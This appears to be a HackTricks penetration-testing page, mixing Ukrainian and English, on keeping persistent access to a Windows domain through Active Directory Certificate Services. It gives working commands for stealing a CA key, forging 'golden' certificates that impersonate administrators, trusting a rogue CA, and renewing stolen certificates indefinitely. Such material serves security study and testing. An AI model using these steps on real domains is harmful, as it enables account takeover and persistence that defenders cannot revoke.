# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Це резюме технік збереження присутності в домені, описаних у [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Перегляньте документ для детальнішої інформації.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

How can you tell that a certificate is a CA certificate?

Можна визначити, що сертифікат є CA-сертифікатом, якщо виконуються кілька умов:

- Сертифікат зберігається на CA-сервері, а його приватний ключ захищено за допомогою DPAPI машини або апаратно (наприклад, TPM/HSM), якщо операційна система це підтримує.
- Поля Issuer та Subject сертифіката збігаються з distinguished name CA.
- Розширення "CA Version" присутнє виключно в CA-сертифікатах.
- У сертифікаті відсутні поля Extended Key Usage (EKU).

Щоб витягти приватний ключ цього сертифікату, підтримуваним методом через вбудований GUI є використання інструмента `certsrv.msc` на CA-сервері. Однак цей сертифікат нічим не відрізняється від інших, збережених у системі; тому для його витягання можуть бути застосовані методи, такі як [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Сертифікат та приватний ключ також можна отримати за допомогою Certipy, використавши наступну команду:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Після отримання сертифіката CA та його приватного ключа у форматі `.pfx`, інструменти, такі як [ForgeCert](https://github.com/GhostPack/ForgeCert), можна використовувати для генерації дійсних сертифікатів:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Користувач, якого обрали для підробки сертифіката, має бути активним і здатним автентифікуватися в Active Directory, щоб процес вдався. Підробка сертифіката для спеціальних облікових записів, таких як krbtgt, неефективна.

Цей підроблений сертифікат буде **дійсним** до вказаної дати завершення та доти, поки дійсний кореневий сертифікат CA (зазвичай від 5 до **10+ років**). Він також дійсний для **машин**, тому у поєднанні з **S4U2Self** нападник може **maintain persistence on any domain machine** доти, доки дійсний сертифікат CA.\
Крім того, **сертифікати, згенеровані** цим методом, **не можуть бути відкликані**, оскільки CA про них не знає.

### Робота під Strong Certificate Mapping Enforcement (2025+)

З 11 лютого 2025 року (після розгортання KB5014754) контролери домену за замовчуванням використовують **Full Enforcement** для відображень сертифікатів. Практично це означає, що ваші підроблені сертифікати повинні або:

- Містити сильне зв'язування з цільовим обліковим записом (наприклад, SID security extension), або
- Бути поєднані з сильним, явним відображенням в атрибуті `altSecurityIdentities` цільового об'єкта.

Надійний підхід для persistence — створити підроблений сертифікат, підписаний вкраденою Enterprise CA, а потім додати сильне явне відображення для victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- Якщо ви можете створити forged certificates, які включають розширення безпеки SID, вони відображатимуться неявно навіть за Full Enforcement. В іншому випадку віддавайте перевагу explicit strong mappings. Див. [account-persistence](account-persistence.md) для додаткової інформації про explicit mappings.
- Відкликання тут не допомагає захисникам: forged certificates відсутні в CA database і тому не можуть бути відкликані.

#### Full-Enforcement compatible forging (SID-aware)

Оновлені інструменти дозволяють вбудовувати SID безпосередньо, зберігаючи golden certificates придатними навіть коли DCs відкидають слабкі mappings:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Вбудовуючи SID, ви уникаєте потреби торкатися `altSecurityIdentities`, які можуть моніторитись, одночасно задовольняючи суворі перевірки відображення.

## Trusting Rogue CA Certificates - DPERSIST2

Об'єкт `NTAuthCertificates` призначений для зберігання одного або кількох **CA certificates** у своєму атрибуті `cacertificate`, який використовує Active Directory (AD). Процес перевірки з боку **domain controller** передбачає перевірку об'єкта `NTAuthCertificates` на наявність запису, що відповідає **CA specified** у полі Issuer автентифікуючого **certificate**. Якщо відповідність знайдено, аутентифікація продовжується.

Зловмисник може додати самопідписаний CA сертифікат в об'єкт `NTAuthCertificates`, якщо він має контроль над цим об'єктом AD. Зазвичай лише члени групи **Enterprise Admin**, а також **Domain Admins** або **Administrators** в **forest root’s domain** мають дозвіл на зміни цього об'єкта. Вони можуть редагувати об'єкт `NTAuthCertificates` за допомогою `certutil.exe` командою `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, або використовуючи [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Додаткові корисні команди для цієї техніки:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
This capability is especially relevant when used in conjunction with a previously outlined method involving ForgeCert to dynamically generate certificates.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Opportunities for **persistence** through **security descriptor modifications of AD CS** components are plentiful. Modifications described in the "[Domain Escalation](domain-escalation.md)" section can be maliciously implemented by an attacker with elevated access. This includes the addition of "control rights" (e.g., WriteOwner/WriteDACL/etc.) to sensitive components such as:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

An example of malicious implementation would involve an attacker, who has **elevated permissions** in the domain, adding the **`WriteOwner`** permission to the default **`User`** certificate template, with the attacker being the principal for the right. To exploit this, the attacker would first change the ownership of the **`User`** template to themselves. Following this, the **`mspki-certificate-name-flag`** would be set to **1** on the template to enable **`ENROLLEE_SUPPLIES_SUBJECT`**, allowing a user to provide a Subject Alternative Name in the request. Subsequently, the attacker could **enroll** using the **template**, choosing a **domain administrator** name as an alternative name, and utilize the acquired certificate for authentication as the DA.

Practical knobs attackers may set for long-term domain persistence (see {{#ref}}domain-escalation.md{{#endref}} for full details and detection):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- Template DACL or settings that allow authentication-capable issuance (e.g., adding Client Authentication EKU, enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> In hardened environments after KB5014754, pairing these misconfigurations with explicit strong mappings (`altSecurityIdentities`) ensures your issued or forged certificates remain usable even when DCs enforce strong mapping.

### Certificate renewal abuse (ESC14) for persistence

If you compromise an authentication-capable certificate (or an Enrollment Agent one), you can **renew it indefinitely** as long as the issuing template remains published and your CA still trusts the issuer chain. Renewal keeps the original identity bindings but extends validity, making eviction difficult unless the template is fixed or the CA is republished.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Якщо доменні контролери перебувають у режимі **Full Enforcement**, додайте `-sid <victim SID>` (або використайте шаблон, який все ще містить розширення безпеки SID), щоб оновлений кінцевий сертифікат і надалі коректно зіставлявся, не чіпаючи `altSecurityIdentities`. Атакувальники з правами адміністратора CA також можуть налаштувати `policy\RenewalValidityPeriodUnits`, щоб подовжити термін дії оновлених сертифікатів перед тим, як видати собі сертифікат.


## Посилання

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
